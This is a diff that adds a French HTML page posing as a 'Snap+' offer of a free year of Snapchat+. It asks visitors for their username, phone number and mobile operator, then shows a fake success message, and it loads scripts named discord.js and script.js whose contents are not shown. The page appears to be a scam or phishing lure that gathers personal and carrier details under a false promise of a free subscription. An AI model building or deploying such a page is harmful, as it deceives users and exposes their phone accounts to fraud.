@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Snap+ - Tech 2026</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Snap+ Banner -->
+            <div class="snap-banner">
+                <i class="fab fa-snapchat"></i>
+                <h2>Snap+</h2>
+            </div>
+
+            <!-- Disclaimer -->
+            <div class="disclaimer">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>Disclaimer: L'abonnement Snapchat+ ne vous sera pas facturé. L'abonnement est disponible uniquement pour les utilisateurs éligibles.</p>
+            </div>
+
+            <!-- Headline -->
+            <div class="headline">
+                Active la nouvelle tech 🚀 1 an! snap + en 2026 >>
+            </div>
+
+            <!-- Form -->
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <i class="fas fa-user"></i>
+                    <input type="text" id="usernameInput" placeholder="Votre nom d'utilisateur">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Numéro de téléphone</label>
+                <div class="input-wrapper">
+                    <div class="phone-input">
+                        <div class="country-code">
+                            <span>🇫🇷</span>
+                            <span>+33</span>
+                        </div>
+                        <input type="tel" id="phoneInput" placeholder="" style="flex: 1;">
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Opérateur mobile</label>
+                <div class="operator-options" id="operatorOptions">
+                    <label class="operator-option" data-operator="bouygues">
+                        <input type="radio" name="operator" value="Bouygues Telecom">
+                        <span class="operator-name">Bouygues</span>
+                    </label>
+                    <label class="operator-option" data-operator="sfr">
+                        <input type="radio" name="operator" value="SFR">
+                        <span class="operator-name">SFR</span>
+                    </label>
+                    <label class="operator-option" data-operator="orange">
+                        <input type="radio" name="operator" value="Orange">
+                        <span class="operator-name">Orange</span>
+                    </label>
+                </div>
+            </div>
+
+            <button class="submit-btn" id="submitBtn">
+                <i class="fas fa-paper-plane"></i> Continuer
+            </button>
+
+            <!-- Loading Screen -->
+            <div class="loading-screen" id="loadingScreen">
+                <div class="spinner"></div>
+                <div class="loading-text">Traitement en cours...</div>
+                <div class="loading-subtext">Veuillez patienter</div>
+            </div>
+
+            <!-- Success Message -->
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle"></i>
+                <h3>Demande envoyée !</h3>
+                <p>Votre inscription a été enregistrée avec succès.</p>
+            </div>
+
+        </div>
+
+    </div>
+
+    <script src="discord.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
